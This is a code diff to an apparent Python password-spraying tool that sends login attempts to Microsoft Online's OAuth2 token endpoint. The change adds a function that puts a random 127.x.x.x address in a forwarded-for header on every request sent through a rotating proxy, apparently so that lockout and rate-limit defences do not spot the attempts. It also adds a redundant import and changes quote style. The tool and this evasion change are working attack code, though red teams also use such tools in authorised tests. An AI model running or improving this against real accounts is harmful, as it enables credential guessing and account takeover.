@@ -1,6 +1,7 @@
 import argparse
 import requests
 import time
+import random
 from datetime import datetime
 from colorama import Fore, Style
 import random
@@ -40,6 +41,10 @@ def check_file(file_path, file):
 def create_directory(directory):
     if not os.path.exists(directory):
         os.makedirs(directory)
+
+
+def generate_ip():
+    return f"127.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 254)}"
 
 
 def parse_arguments():
@@ -143,6 +148,7 @@ def entra_spray(
             f"[*] Now spraying Microsoft Online.",
             full_log,
         )
+
         non_compromised_users = []
         for username in usernames:
 
@@ -176,19 +182,20 @@ def entra_spray(
             urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
             if proxy:
                 proxies = {
-                    'http': proxy,
-                    'https': proxy,
+                    "http": proxy,
+                    "https": proxy,
                 }
             if not proxy:
                 proxies = None
 
             # Add "X-My-X-Forwarded-For" header for Firprox (if "microsoft" is not in the url value)
+            # Use a random localhost (127.X.X.X) address for each request
             r = requests.post(
                 f"{url}/common/oauth2/token",
                 headers={
                     **post_headers,
                     **(
-                        {"X-My-X-Forwarded-For": "127.0.0.1"}
+                        {"X-My-X-Forwarded-For": generate_ip()}
                         if "microsoft" not in url
                         else {}
                     ),
